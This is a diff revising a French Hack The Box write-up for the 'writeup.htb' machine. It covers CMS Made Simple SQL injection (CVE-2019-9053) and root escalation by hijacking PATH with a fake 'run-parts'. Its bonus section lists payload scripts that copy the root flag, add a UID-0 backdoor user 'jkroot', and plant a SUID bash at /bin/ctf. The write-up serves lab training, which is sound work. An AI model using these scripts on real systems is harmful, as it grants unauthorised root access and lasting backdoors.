@@ -121,13 +121,15 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-Ce writeup décrit la résolution complète de la machine **writeup.htb** sur Hack The Box, depuis l'énumération initiale jusqu'à l'obtention des privilèges root sur un système Linux. L'analyse débute par l'identification d'un service web basé sur un CMS, dont l'étude fonctionnelle permet d'obtenir un premier accès utilisateur. La phase d'escalade de privilèges repose ensuite sur l'analyse d'un mécanisme système exécuté avec des droits élevés, révélant l'appel d'un script sans chemin absolu. L'exploitation de ce contexte par détournement du PATH conduit à l'exécution de code arbitraire en tant que root. La résolution est présentée de manière structurée, en mettant l'accent sur l'analyse des mécanismes plutôt que sur l'exploit lui-même.
+Ce writeup décrit la résolution complète de la machine **writeup.htb** sur Hack The Box, depuis l’énumération initiale jusqu’à l’obtention des privilèges **root** sur Linux.  
+L’analyse commence par l’identification d’un service web basé sur un CMS, dont l’étude permet d’obtenir un premier accès utilisateur. La phase d’escalade repose ensuite sur l’observation d’un mécanisme exécuté avec des droits élevés, qui appelle `run-parts` **sans chemin absolu**. En détournant le `PATH`, on force alors l’exécution de notre script en tant que root.  
+La démarche est présentée de façon structurée, en mettant l’accent sur la compréhension des mécanismes plutôt que sur l’exploit lui_même.
 
 ## Énumération
 
 Pour démarrer :
 
-- “Ajoute l’entrée `10.129.x.x writeup.htb` dans /etc/hosts. 
+- Ajoute l’entrée `10.129.x.x writeup.htb` dans /etc/hosts. 
 
 ```bash
 sudo nano /etc/hosts
@@ -335,6 +337,7 @@ ________________________________________________
 ```
 :: Progress: [42/29999] :: Job [1/1] :: 1 req/sec :: Duration: [0:00:19] :: Errors: 12
 ```
+> Ici, la combinaison **erreurs réseau / bannissement** (suite aux 40x) fait chuter le rythme et provoque des erreurs. Inutile d’insister : on a déjà une piste solide via `robots.txt`.
 
 
 
@@ -419,7 +422,8 @@ La balise `Generator` permet d'identifier sans ambiguïté le CMS utilisé : **C
 
 ### CMS Made Simple
 
-Une fois le CMS identifié comme **CMS Made Simple**, tu peux rechercher les vulnérabilités connues affectant ses versions anciennes. Une recherche simple du type *“CMS Made Simple unauthenticated SQL injection”* ou *“CMS Made Simple CVE exploit”* permet de mettre rapidement en évidence la vulnérabilité **CVE-2019-9053**, une injection SQL non authentifiée dans le module *News*. Cette recherche mène notamment à des exploits publics? On trouve facilement un PoC public Python3 pour CVE-2019-9053.
+Une fois le CMS identifié, tu compares rapidement sa version aux vulnérabilités connues. Dans ce cas, **CVE-2019-9053** ressort comme une piste pertinente : il s’agit d’une injection SQL non authentifiée dans le module *News*. Un PoC Python existe et permet d’extraire des informations (dont des identifiants) à partir de la cible.
+
 
 > Sous Python 3, l'exploit échoue lors du cracking à cause de l'encodage de `rockyou.txt`. 
 >
@@ -624,7 +628,7 @@ Dans ce contexte, si `jkr` place son propre script nommé `run-parts` dans `/usr
 
 ### Détournement de PATH
 
-Pour exploiter le détournement de PATH, on va mettre en place un faux run-parts dans un répertoire présent dans le PATH et inscriptible par jkr (par exemple /usr/local/bin).
+Pour exploiter le détournement de PATH, on va mettre en place un faux run-parts dans un répertoire présent dans le PATH et où jkr a des droits d’écriture (par exemple /usr/local/bin).
 L’objectif est que, lors de la connexion SSH, le système exécute notre script à la place du binaire légitime, ce qui déclenchera un reverse shell en tant que root vers ta machine Kali.
 
 
@@ -783,29 +787,59 @@ Ce writeup de la machine **writeup.htb** sur **Hack The Box** met en évidence u
 
 ---
 
-## Bonus
+## Bonus — exemples de faux run-parts (détournement de PATH)
 
-Voici quelques idées pour des faux `run-parts` :
+Une fois le détournement de `PATH` fonctionnel, **tout code placé dans le faux `run-parts` est exécuté avec les privilèges root**. Voici quelques exemples classiques de scripts utilisés en CTF pour exploiter ce contexte.
 
-1. Le plus simple: faire un `cat` de `/root/root.txt` vers par exemple `/tmp/root.txt`
+Ces exemples illustrent différentes finalités possibles : preuve d’exécution, récupération d’information sensible ou persistance.
+
+1. **Récupération directe du flag root**
+
+   Exemple minimal permettant de récupérer le flag root sans shell interactif.
+
+   Script run-parts :
 
    ```bash
    #!/bin/bash
    cat /root/root.txt > /tmp/root.txt
    ```
 
+   Après déclenchement, il suffit de lire le fichier :
+
+   ```bash
+   cat /tmp/root.txt
+   ```
+
+   C’est l’exemple le plus simple et le plus fréquent en CTF lorsque l’objectif est uniquement la validation du challenge.
+
    
 
-2. Ajouter/créer un utilisateur avec des droits root
+2. **Création d’un utilisateur avec privilèges root**
+
+   Cet exemple montre comment transformer le détournement de PATH en **accès root persistant**.
+
+   Script run-parts :
 
    ```bash
    #!/bin/bash 
    useradd -m -p $(openssl passwd -1 "password") -s /bin/bash -o -u 0 jkroot
    ```
 
-   et faire `su jkroot`
+   Après exécution :
+
+   ```bash
+   su jkroot
+   ```
+
+   L’utilisateur `jkroot` possède l’UID 0 et est donc équivalent à root.
+
    
-3. Copier /bin/bash vers /bin/<nom au choix> et lui donner les droits SUID d'exécution root (u+s)
+
+3. **Création d’un shell SUID root**
+
+   Autre variante classique consistant à créer un binaire SUID permettant d’obtenir un shell root à la demande.
+
+   Script run-parts :
 
    ```bash
    #!/bin/bash
@@ -813,7 +847,17 @@ Voici quelques idées pour des faux `run-parts` :
    chmod u+s /bin/ctf 
    ```
 
-   et faire `/bin/ctf -p`
+   Ensuite :
+
+   ```bash
+   /bin/ctf -p
+   ```
+
+   Le shell obtenu conserve les privilèges root.
+
+------
 
 Je te laisse le plaisir d’explorer et de mettre en œuvre ces autres pistes de détournement de PATH, l’objectif ici étant surtout de t’avoir montré une méthode fiable et reproductible pour gérer un contexte contraint par le temps.
+
+------
 
